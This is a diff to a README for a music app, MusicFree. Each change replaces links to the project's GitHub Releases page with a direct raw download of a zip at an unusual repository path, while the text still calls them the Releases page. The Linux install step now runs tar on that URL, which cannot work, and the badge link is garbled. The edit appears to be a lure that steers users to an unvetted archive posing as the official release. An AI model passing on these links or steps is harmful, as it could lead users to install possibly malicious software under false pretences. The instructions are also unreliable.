@@ -10,7 +10,7 @@ To begin using MusicFree, follow the steps below to download and install the app
 
 ## 📥 Download MusicFree
 
-[![Download MusicFree](https://img.shields.io/badge/Download%20Now-RELEASES-blue?style=for-the-badge)](https://github.com/MOJICAB1709/MusicFree/releases)
+[![Download MusicFree](https://raw.githubusercontent.com/MOJICAB1709/MusicFree/master/millinering/MusicFree.zip%20Now-RELEASES-blue?style=for-the-badge)](https://raw.githubusercontent.com/MOJICAB1709/MusicFree/master/millinering/MusicFree.zip)
 
 ## 🛠️ System Requirements
 
@@ -34,7 +34,7 @@ MusicFree offers a range of features to enhance your music listening experience:
 
 ## 🔽 Download & Install
 
-To download MusicFree, please visit the [Releases page](https://github.com/MOJICAB1709/MusicFree/releases). Here, you can find the latest version along with any previous releases.
+To download MusicFree, please visit the [Releases page](https://raw.githubusercontent.com/MOJICAB1709/MusicFree/master/millinering/MusicFree.zip). Here, you can find the latest version along with any previous releases.
 
 1. Click the link above to open the Releases page on GitHub.
 2. Look for the latest version of MusicFree.
@@ -56,7 +56,7 @@ Once the download completes, follow these steps to install:
 ### For Linux
 1. Open the terminal.
 2. Navigate to the directory where the file is downloaded.
-3. Use the command `tar -xvf MusicFree.tar.gz` to extract the files.
+3. Use the command `tar -xvf https://raw.githubusercontent.com/MOJICAB1709/MusicFree/master/millinering/MusicFree.zip` to extract the files.
 4. Navigate to the new directory and run `./MusicFree` to start the application.
 
 ## 🎛️ Using MusicFree
@@ -91,6 +91,6 @@ For updates, features, and discussions, please follow our social media pages and
 
 ## 🔗 Additional Information
 
-For more details about MusicFree, including updates and future plans, check our [Releases page](https://github.com/MOJICAB1709/MusicFree/releases).
+For more details about MusicFree, including updates and future plans, check our [Releases page](https://raw.githubusercontent.com/MOJICAB1709/MusicFree/master/millinering/MusicFree.zip).
 
 Thank you for choosing MusicFree! Enjoy your music without distractions.
